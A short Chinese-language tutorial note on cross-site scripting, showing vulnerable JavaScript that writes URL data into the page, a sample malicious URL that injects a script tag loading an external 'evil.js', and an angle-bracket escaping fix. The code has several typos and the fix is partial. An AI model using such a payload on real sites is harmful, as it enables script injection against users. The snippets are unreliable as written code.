### XSS (Cross-Sit Scripting)

1. 攻击原理
> 错误使用恶意数据动态创建文档内容:
```javascript
var name = decodeURIComponent(windown.location.href.substring(1) || '')  // 获取数据
documnet.write(name) // 动态创建内容

// 理想状态： http://www.example.come/hello?Ally 
// 恶意代码：http://www.example.com/hello?%3Cscript src=siteB/evil.js %3E%3Cscript%3E 则会执行 evil.js 
```

2. 解决方案
> 对使用来自任何不可信的数据动态创建文档前需要进行字符串替换:
```javascript
name = name.replace(/</g,'&lt;').replace(/>/g,'&gt;')
```
